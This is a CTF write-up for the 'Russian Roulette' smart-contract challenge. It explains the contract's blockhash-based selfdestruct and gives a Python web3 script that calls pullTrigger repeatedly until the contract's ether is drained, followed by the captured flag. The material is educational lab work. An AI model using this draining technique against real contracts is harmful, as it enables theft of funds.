---
title: "Russian Roulette - Cyber Apocalypse 2024: Hacker Royale"
category: "blockchain"
subcategory: "smart-contract"
type: "writeup"
tags: ["blockchain", "solidity", "russian", "roulette", "smart-contract", "cyber-apocalypse-2024-hacker-r", "cyber-apocalypse-2024-hacker-royal", "2024", "ctf-writeup"]
summary: "Welcome to The Fray. This is a warm-up to test if you have what it takes to tackle the challenges of the realm."
source:
  name: "CTFtime writeup #38987"
  url: "https://ctftime.org/writeup/38987"
ctf:
  name: "Cyber Apocalypse 2024: Hacker Royale"
  year: 2024
  challenge: "Russian Roulette"
---

## Metadata

- **CTF:** Cyber Apocalypse 2024: Hacker Royale
- **Task:** Russian Roulette
- **Author team:** D0M BU$TЄR$
- **CTFtime:** <https://ctftime.org/writeup/38987>

---
```  
Welcome to The Fray. This is a warm-up to test if you have what it takes to tackle the challenges of the realm. Are you brave enough?  
```

### Setup

```solidity  
pragma solidity 0.8.23;

import {RussianRoulette} from "./RussianRoulette.sol";

contract Setup {  
RussianRoulette public immutable TARGET;

constructor() payable {  
TARGET = new RussianRoulette{value: 10 ether}();  
}

function isSolved() public view returns (bool) {  
return address(TARGET).balance == 0;  
}  
}  
```

This Setup.sol sends 10 ether to the `RussianRoulette.sol` contract, and it has an `isSolved()` function that returns a bool if the `RussianRoulette` contract is 0. Here's `RussianRoulette.sol`.

```solidity  
pragma solidity 0.8.23;

contract RussianRoulette {

constructor() payable {  
// i need more bullets  
}

function pullTrigger() public returns (string memory) {  
if (uint256(blockhash(block.number - 1)) % 10 == 7) {  
selfdestruct(payable(msg.sender)); // ?  
} else {  
return "im SAFU ... for now";  
}  
}  
}  
```

In the `RussianRoulette` contract, it has a `pullTrigger` function that returns a string, and if the blockhash of the previous block is divisible by 10 and the remainder is 7, it self-destructs. When a contract self-destructs, it sends all of its remaining balance to the caller (which is us in this case), and because the `isSolved` function checks if the balance is 0, we can just keep pulling the trigger until it triggers `selfdestruct`, and then we can get the flag. Here's a solution using plain Python

\---

### Solution

```python  
from web3 import Web3  
from pwn import remote

# inline ABI's (who would've known this was possible)  
setup_abi = [  
{"inputs": [], "stateMutability": "payable", "type": "constructor"},  
{"inputs": [], "name": "TARGET", "outputs": [{"internalType": "contract RussianRoulette", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},  
{"inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "view", "type": "function"}  
]

rr_abi = [  
{"inputs": [], "stateMutability": "payable", "type": "constructor"},  
{"inputs": [], "name": "pullTrigger", "outputs": [{"internalType": "string", "name": "", "type": "string"}], "stateMutability": "nonpayable", "type": "function"}  
]

def getAddressAndConnectToRPC():  
global HOST, RPC_PORT, SEND_PORT, w3  
  
HOST = '94.237.57.59'  
RPC_PORT = 45549  
SEND_PORT = 34083  
  
r = remote(HOST, SEND_PORT)  
r.recvline()  
r.sendline(b'1')  
  
contents = r.recvall().strip().decode()  
r.close()  
  
replacements = [  
"2 - Restart Instance", "3 - Get flag", "action?", "Private key",  
"Address", "Target contract", ":", "Setup contract", " "  
]  
  
for item in replacements:  
contents = contents.replace(item, "")  
  
contents = contents.strip()  
lines = contents.splitlines()  
  
global private_key, address, target_contract, setup_contract  
private_key = lines[0]  
address = lines[1]  
target_contract = lines[2]  
setup_contract = lines[3]

# call the function to get the variables  
getAddressAndConnectToRPC()

# connecting to ethereum  
rpc_url = 'http://{}:{}'.format(HOST, RPC_PORT)  
web3 = Web3(Web3.HTTPProvider(rpc_url))

# creating the contracts  
setup_contract = web3.eth.contract(address=setup_contract, abi=setup_abi)  
russian_roulette_contract = web3.eth.contract(address=target_contract, abi=rr_abi)

# pulling trigger until the contract balance is zero  
while web3.eth.get_balance(target_contract) > 0:  
tx_hash = russian_roulette_contract.functions.pullTrigger().transact()  
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)  
print("Trigger pulled. Transaction receipt:", tx_receipt)

print("got the flag!")

# connecting to second remote, getting the flag  
r = remote(HOST, SEND_PORT)

# recieves the first three lines, couldn't find any more efficient way  
for _ in range(3):  
r.recvline()

# sending 3 - which maps to "Get flag"  
r.sendline(b'3')

# recieves the line containing the flag  
flag = str(r.recvline().strip().decode()).replace("action?", "").strip()

print(flag)  
```

And the flag is:

```text  
HTB{99%_0f_g4mbl3rs_quit_b4_bigwin}  
```
